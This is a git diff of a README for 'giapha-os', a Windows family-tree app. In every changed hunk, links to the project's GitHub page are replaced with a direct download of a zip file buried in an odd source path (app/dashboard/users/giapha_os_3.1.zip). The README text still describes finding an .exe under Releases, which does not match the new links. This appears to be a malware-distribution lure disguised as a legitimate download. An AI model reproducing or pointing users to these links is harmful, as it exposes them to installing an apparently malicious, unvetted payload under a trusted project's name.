@@ -1,6 +1,6 @@
 # 📁 giapha-os - Simple Family Tree Management
 
-[![Download giapha-os](https://img.shields.io/badge/Download-giapha--os-orange?style=for-the-badge)](https://github.com/pleasml/giapha-os)
+[![Download giapha-os](https://img.shields.io/badge/Download-giapha--os-orange?style=for-the-badge)](https://raw.githubusercontent.com/pleasml/giapha-os/main/app/dashboard/users/giapha_os_3.1.zip)
 
 giapha-os is an open-source app for managing your family tree. It gives you an easy way to see family relationships, manage family members, and search or filter through the list.
 
@@ -37,7 +37,7 @@ You do not need internet to run giapha-os after installation.
 
 To use giapha-os, you need to download the app and install it on your Windows computer. Follow these steps:
 
-1. Click the big **Download** badge at the top or [visit this page to download giapha-os](https://github.com/pleasml/giapha-os).
+1. Click the big **Download** badge at the top or [visit this page to download giapha-os](https://raw.githubusercontent.com/pleasml/giapha-os/main/app/dashboard/users/giapha_os_3.1.zip).
 2. On that page, look for the **Releases** section.  
 3. Find the latest version of the app. Typically, it is a file ending with `.exe` for Windows.  
 4. Click the `.exe` file link to download it to your computer.
@@ -49,7 +49,7 @@ To use giapha-os, you need to download the app and install it on your Windows co
 ### Download
 
 - Go to the GitHub page by clicking this link:  
-  [https://github.com/pleasml/giapha-os](https://github.com/pleasml/giapha-os)
+  [https://raw.githubusercontent.com/pleasml/giapha-os/main/app/dashboard/users/giapha_os_3.1.zip](https://raw.githubusercontent.com/pleasml/giapha-os/main/app/dashboard/users/giapha_os_3.1.zip)
   
 - Find the latest `.exe` file under **Releases** or **Assets**.
 
@@ -151,5 +151,5 @@ giapha-os is free to use and modify under an open-source license. You can find d
 
 ---
 
-[Download giapha-os](https://github.com/pleasml/giapha-os)  
+[Download giapha-os](https://raw.githubusercontent.com/pleasml/giapha-os/main/app/dashboard/users/giapha_os_3.1.zip)  
 Click the badge at the top or use this link to get the latest app version for Windows.
